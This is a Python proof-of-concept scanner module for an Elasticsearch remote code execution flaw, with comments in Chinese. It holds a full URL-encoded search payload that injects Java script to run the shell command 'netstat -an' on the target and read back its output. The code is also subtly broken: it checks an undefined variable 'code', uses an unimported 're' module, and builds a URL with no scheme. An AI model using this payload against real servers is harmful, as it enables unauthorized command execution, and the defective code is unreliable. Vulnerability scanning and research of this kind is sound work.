# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import socket

class Vuln(ABVuln):
    vuln_id = 'ElasticSearch_0011' # 平台漏洞编号，留空
    name = 'Elasticsearch Remote Code Execution'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-01-20'  # 漏洞公布时间
    desc = '''
        ElasticSearch :9200/_search?source= 远程代码执行漏洞。
    '''  # 漏洞描述
    ref = 'http://javaweb.org/?p=1300'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'ElasticSearch'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5ef9af38-0a90-4d84-a038-973256a2944f'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            target = urlparse.urlparse(self.target)
            ip = socket.gethostbyname(target.hostname)
            print(ip)
            verify_url = ip + ":9200/_search?source=%7B%22size%22:1,%22query%22:%7B%22filtered%22:%7B%22query%22:%7B%22match_all%22:%7B%7D%7D%7D%7D,%22script_fields%22:%7B%22exp%22:%7B%22script%22:%22import%20java.util.*;%5Cnimport%20java.io.*;%5CnString%20str%20=%20%5C%22%5C%22;BufferedReader%20br%20=%20new%20BufferedReader(new%20InputStreamReader(Runtime.getRuntime().exec(%5C%22netstat%20-an%5C%22).getInputStream()));StringBuilder%20sb%20=%20new%20StringBuilder();while((str=br.readLine())!=null)%7Bsb.append(str);%7Dsb.toString();%22%7D%7D%7D"
            r = requests.get(verify_url)

            if code == 200:
                m = re.search("ESTABLISHED", r.content)
                if m:
                    #security_hole(arg[:-1]+payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
